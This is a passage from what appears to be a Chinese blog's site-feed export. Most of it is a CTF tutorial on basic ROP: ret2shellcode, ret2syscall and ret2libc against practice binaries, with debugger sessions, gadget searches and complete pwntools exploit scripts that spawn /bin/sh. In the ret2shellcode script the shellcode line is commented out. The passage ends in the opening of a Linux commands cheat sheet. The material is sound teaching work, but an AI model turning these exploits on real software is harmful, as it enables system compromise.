/usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7d9d000 0xf7f24000 r-xp   187000 23000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7f24000 0xf7fa9000 r--p   85000  1aa000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7fa9000 0xf7fab000 r--p   2000  22f000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7fab000 0xf7fac000 rw-p   1000  231000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7fac000 0xf7fb6000 rw-p   a000       0 [anon_f7fac]</span><br><span class="line">0xf7fc1000 0xf7fc3000 rw-p   2000       0 [anon_f7fc1]</span><br><span class="line">0xf7fc3000 0xf7fc7000 r--p   4000       0 [vvar]</span><br><span class="line">0xf7fc7000 0xf7fc9000 r-xp   2000       0 [vdso]</span><br><span class="line">0xf7fc9000 0xf7fca000 r--p   1000    0 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7fca000 0xf7fed000 r-xp  23000 1000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7fed000 0xf7ffb000 r--p  e000 24000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7ffb000 0xf7ffd000 r--p 2000  31000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p 1000  33000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xfffdd000 0xffffe000 rwxp   21000      0 [stack]</span><br></pre></td></tr></table></figure><p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x804a000  0x804b000 rw-p    1000    1000 ret2shellcode</span><br></pre></td></tr></table></figure><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804858C                 lea     eax, [esp+80h+s]</span><br><span class="line">.text:08048590                 mov     [esp], eax      ; s</span><br><span class="line">.text:08048593                 call    _gets</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b *0x08048593</span><br><span class="line">Breakpoint 1 at 0x8048593: file ret2shellcode.c, line 14.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">No system <span class="keyword">for</span> you this <span class="keyword">time</span> !!!</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048593 <span class="keyword">in</span> main () at ret2shellcode.c:14</span><br><span class="line">warning: 14ret2shellcode.c: No such file or directory</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span><br><span class="line"> EAX  0xffffd49c ◂— 0</span><br><span class="line"> EBX  0xf7faae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0xf7fac8a0 (_IO_stdfile_1_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd508 ◂— 0</span><br><span class="line"> ESP  0xffffd480 —▸ 0xffffd49c ◂— 0</span><br><span class="line"> EIP  0x8048593 (main+102) —▸ 0xfffe38e8 ◂— 0</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffffd480，ebp 为 0xffffd508，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断：</p><ul><li>s 的地址为 0xffffd49c</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>最后的 payload 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh()) #生成执行/bin/s的汇编代码（字符串形式）</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<span class="comment">#将 shellcode 填充到 112 字节，不足部分用 b&#x27;A&#x27; 补足</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_5">¶</a></h3><ul><li>sniperoj-pwn100-shellcode-x86-64</li></ul><h2 id="ret2syscall¶"><a href="#ret2syscall¶" class="headerlink" title="ret2syscall¶"></a>ret2syscall<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">¶</a></h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_6">¶</a></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><h3 id="例子-¶"><a href="#例子-¶" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_7">¶</a></h3><p>这里我们继续以 bamboofox 中的 ret2syscall 为例。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p></blockquote><p>首先检测程序开启的保护：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall checksec rop</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 进行反编译：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考：</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li></ul><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p><p>类似的，我们可以得到控制其它寄存器的 gadgets</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这里，我选择</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这个可以直接控制其它三个寄存器。</p><p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>同时，也找到对应的地址了。</p><p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./rop&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目-¶-1"><a href="#题目-¶-1" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_8">¶</a></h3><h2 id="ret2libc¶"><a href="#ret2libc¶" class="headerlink" title="ret2libc¶"></a>ret2libc<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc">¶</a></h2><h3 id="原理-¶-1"><a href="#原理-¶-1" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_9">¶</a></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p><h3 id="例子-¶-1"><a href="#例子-¶-1" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10">¶</a></h3><p>我们由简单到难分别给出三个例子。</p><h4 id="例-1¶"><a href="#例-1¶" class="headerlink" title="例 1¶"></a>例 1<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">¶</a></h4><p>这里我们以 bamboofox 中 ret2libc1 为例。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p></blockquote><p>首先，我们检查一下程序的安全保护：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2libc1 checksec ret2libc1    </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面对程序进行反编译以确定漏洞位置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;RET2LIBC &gt;_&lt;&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 &#x2F;bin&#x2F;sh 存在：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2libc1 ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27;          </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line"></span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_plt, b&#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 <code>&#39;bbbb&#39;</code> 作为虚假的地址，其后参数对应的参数内容。</p><p>这个例子相对来说简单，同时提供了 system 地址与 &#x2F;bin&#x2F;sh 的地址，但是大多数程序并不会有这么好的情况。</p><h4 id="例-2¶"><a href="#例-2¶" class="headerlink" title="例 2¶"></a>例 2<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2">¶</a></h4><p>这里以 bamboofox 中的 ret2libc2 为例 。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p></blockquote><p>该题目与例 1 基本一致，只不过不再出现 &#x2F;bin&#x2F;sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“&#x2F;bin&#x2F;sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [b&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(b&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 &#x2F;bin&#x2F;sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p><h4 id="例-3¶"><a href="#例-3¶" class="headerlink" title="例 3¶"></a>例 3<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3">¶</a></h4><p>这里以 bamboofox 中的 ret2libc3 为例 。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p></blockquote><p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 &#x2F;bin&#x2F;sh 字符串的地址。首先，查看安全保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2libc3 checksec ret2libc3</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);</span><br><span class="line">  printf(&quot;Can you find it !?&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点：</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme：</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>exp 如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = ret2libc3.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(b&#x27;Can you find it !?&#x27;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[0:4])</span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目-¶-2"><a href="#题目-¶-2" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_11">¶</a></h3><ul><li>train.cs.nctu.edu.tw: ret2libc</li></ul><p>[ret2text]: </p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
          <category> 3-基本ROP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/7070f1e7a12f.html"/>
      <url>/2025/07/7070f1e7a12f.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 3-ELF 文件链接 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/a0bfb9c20b31.html"/>
      <url>/2025/07/a0bfb9c20b31.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 3-ELF 文件链接 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/e95b91c59fd3.html"/>
      <url>/2025/07/e95b91c59fd3.html</url>
      
        <content type="html"><![CDATA[<p>title: 可执行文件装载与虚拟内存<br>date: 2025-06-28 20:16:36<br>categories:   - PWN -ELF文件格式</p><p>tags: </p><p><img src="/./../../../../../images/image-20250629232102031.png" alt="image-20250629232102031"></p><p><img src="/./../../../../../images/image-20250629232917087.png" alt="image-20250629232917087"></p><p><img src="/./../../../../../images/image-20250629233100682.png" alt="image-20250629233100682"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 2-ELF文件格式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/bf16778323fb.html"/>
      <url>/2025/07/bf16778323fb.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 1-从源代码到可执行文件 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/877c6e4ae0f9.html"/>
      <url>/2025/07/877c6e4ae0f9.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 2-汇编基础 </category>
          
          <category> CPU架构与指令集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2025/07/719992c35129.html"/>
      <url>/2025/07/719992c35129.html</url>
      
        <content type="html"><![CDATA[<h1 id="终端命令格式"><a href="#终端命令格式" class="headerlink" title="终端命令格式"></a>终端命令格式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>·command ：命令名，相应功能的英文单词或单词的缩写<br>·[-options] ：选项，可用来对命令进行控制，也可以省略<br>·parameter ：传给命令的参数，可以是 零个、一个 或者 多个</p><h2 id="目录操作命令-cd、pwd、ls、mkdir、rmdir、du"><a href="#目录操作命令-cd、pwd、ls、mkdir、rmdir、du" class="headerlink" title="目录操作命令 cd、pwd、ls、mkdir、rmdir、du"></a>目录操作命令 cd、pwd、ls、mkdir、rmdir、du</h2><table><thead><tr><th>命令 &#x2F; 选项组合</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>基础命令</strong></td><td></td></tr><tr><td><code>cd</code></td><td>切换到另一个目录</td></tr><tr><td><code>pwd</code></td><td>打印当前所在目录（print working directory ）</td></tr><tr><td><code>ls</code></td><td>列出目录内容</td></tr><tr><td><strong><code>ls</code> 常用选项</strong></td><td></td></tr><tr><td><code>ls -l</code></td><td>长格式输出文件，一个文件显示一行（简写 <code>ll</code> ）</td></tr><tr><td><code>ls -a</code></td><td>显示以 <code>.</code> 开头的隐藏文件（默认不显示隐藏文件 ）</td></tr><tr><td><code>ls -d</code></td><td>显示目录本身，而非目录下的文件（默认目录会展开显示内容 ）</td></tr><tr><td><code>ls -lh</code></td><td>长格式输出 + 字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><code>ls -t</code></td><td>按<strong>修改时间从晚到早</strong>排序文件（最近修改的先显示 ）</td></tr><tr><td><code>ls -tr</code></td><td>按<strong>修改时间从早到晚</strong>排序文件（最近修改的后显示 ）</td></tr><tr><td><code>ls 